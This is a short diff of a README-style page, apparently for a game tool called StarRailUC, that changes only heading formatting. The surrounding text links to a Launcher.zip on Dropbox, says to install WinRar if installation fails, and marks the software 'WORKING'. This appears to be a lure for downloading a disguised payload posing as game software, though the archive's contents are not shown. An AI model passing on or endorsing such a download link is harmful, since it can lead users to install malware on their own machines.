@@ -4,7 +4,7 @@
 
 # 📁Software: [HERE](https://dl.dropboxusercontent.com/scl/fi/xnz4fm9l50zx67d9tl21u/Launcher.zip?rlkey=nsye76y375ig7d9geraku6x72&dl=0)
 
-📌Information:
+### 📌Information:
 
 🔥If you can’t download / install program , you need to:
 
@@ -14,7 +14,7 @@
 
 🔥Install WinRar on your computer.
 
-###Status: ✅WORKING
+### Status: ✅WORKING
 
 ![2](https://github.com/Zz3r0x/StarRailUC/assets/140271071/ac2f3ef3-23c3-4a98-a97f-487d5353dc81)
 
